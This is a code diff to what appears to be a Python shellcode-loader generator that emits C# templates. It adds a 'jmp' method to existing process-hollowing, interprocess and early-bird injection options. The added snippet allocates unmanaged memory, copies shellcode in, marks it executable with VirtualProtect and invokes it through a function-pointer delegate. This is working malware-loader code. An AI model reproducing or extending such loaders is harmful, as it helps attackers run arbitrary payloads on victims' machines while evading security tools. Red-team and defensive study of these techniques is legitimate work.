@@ -618,18 +618,36 @@ START_PROCESS_EARLYBIRD_CODE = """
             }
 """
 
+START_PROCESS_JMP_PINVOKE_IMPORT = ["VirtualProtect"]
+START_SHELLCODE_JMP_CODE_IMPORT = """
+public const uint PAGE_EXECUTE_READ = 0x20;
+"""
+#      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+JMP_SHELLCODE = """
+        IntPtr address = Marshal.AllocHGlobal(shellcode.Length);
+        Marshal.Copy(shellcode, 0, address, shellcode.Length);
+        uint oldProtection;
+        bool success = VirtualProtect(address, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtection);
+
+        Action executeAssembly = (Action)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(address, typeof(Action));
+        executeAssembly();
+"""
+
 import_choices_pinvoke_import = {
   'hollow':START_PROCESS_HOLLOW_PINVOKE_IMPORT,
   'interprocess':START_PROCESS_INTERPROCESS_PINVOKE_IMPORT,
   'earlybird':START_PROCESS_EARLYBIRD_PINVOKE_IMPORT,
   'standard':START_SHELLCODE_PINVOKE_IMPORT,
+  'jmp': START_PROCESS_JMP_PINVOKE_IMPORT,
 }
 
 import_choices_code_import = {
   'hollow':f"{START_PROCESS_HOLLOW_CODE_IMPORT}",
   'interprocess':f"{START_PROCESS_INTERPROCESS_CODE_IMPORT}",
   'earlybird':f"{START_PROCESS_EARLYBIRD_CODE_IMPORT}",
-  'standard':f"{START_SHELLCODE_CODE_IMPORT}"
+  'standard':f"{START_SHELLCODE_CODE_IMPORT}",
+  'jmp':f"{START_SHELLCODE_JMP_CODE_IMPORT}",
 }
 
 main_choices = {
@@ -645,6 +663,7 @@ main_choices = {
   'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
   'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
   'standard':"{ak.START_SHELLCODE}",
+  'jmp':"{ak.JMP_SHELLCODE}",
 }
 
 def get_pinvoke_import(pinvoke):
